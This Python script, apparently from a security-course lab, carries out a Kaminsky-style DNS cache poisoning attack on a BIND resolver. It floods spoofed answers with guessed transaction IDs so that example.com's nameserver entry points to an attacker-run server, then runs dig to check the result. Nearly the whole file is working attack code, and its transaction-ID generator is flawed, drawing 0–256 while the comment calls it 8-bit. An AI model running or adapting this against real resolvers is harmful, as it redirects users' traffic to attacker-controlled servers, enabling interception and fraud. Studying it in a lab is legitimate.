#!/usr/bin/env python
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call
import os

DEBUG = False

parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
#parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
#dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

#Our nameserver that we want to poison the BIND cache so that it maps to it
attack_NS = 'ns.dnslabattacker.net.'

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Pretend to be the NS and send a DNS response to BIND
'''
def spoofedDNSResponseFromNS(sock, name):
    #pretend to send a response from the name server to the BIND server, 
    #we use a random TXID and set the qname to be the NS.
    #we also set aa, qr, ancount and nscount to 1 (so that it seems 
    #like a response from the name server)
    #Finally we modify the an and ns fields to match the NS
    #For quick reference of DNS Packet and what fields to set
    #http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html#packet
    responsePacket = DNS(rd=1, qd=DNSQR(qname=name, qtype = 1), \
        id = getRandomTXID(), aa = 1, qr=1,  \
        ancount = 1, nscount = 1)

    responsePacket.an = DNSRR(rrname=name, type='A', ttl=3600, rdata='93.184.216.34')
    responsePacket.ns = DNSRR(rrname='example.com', type='NS', rclass=1,\
     ttl=3600, rdata=attack_NS)

    #Send the packet to BIND as a presumed response from the NS
    sendPacket(sock, responsePacket, my_ip, my_query_port)

'''
Sends a DNS Query to the BIND server.
'''
def sendDNSQuerytoBIND():
    #generate a non-existing name in example so that the BIND server cannot fetch 
    #the mapping from its cache and has to send a DNS request to the NS
    queryName = getRandomSubDomain()+'.example.com.'
    #print(queryName)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=queryName))
    #Send the legitimate request
    sendPacket(sock, dnsPacket, my_ip, my_port)
    #At the same time, send a flood of fake responses to BIND 
    #pretending to be the Name Server. We abritrarily send 25 packets 
    #and hope one of them succeeds
    flood_count = 25
    for i in range(flood_count):
        spoofedDNSResponseFromNS(sock, queryName)
    #We've got a response from the BIND server.
    response = sock.recv(4096)
    response = DNS(response)
    
    if DEBUG:
        print "\n***** Packet Received from actual BIND Server *****"
        print response.show()
        print "***** End of Remote Server Packet *****\n"
    
    #check to see if the nameserver got poisoned.
    attack_status = (response.ns is not None and response.ns.rdata == attack_NS)
    return attack_status

if __name__ == '__main__':
    #setup a UDP server to get a DNS request over UDP
    succeeded = False
    while not succeeded:
        #send a DNS query to BIND
        succeeded = sendDNSQuerytoBIND()
    #verify the cache poisioning worked
    command = "dig @" + str(my_ip) + " NS example.com -p " + str(my_port)
    os.system(command)
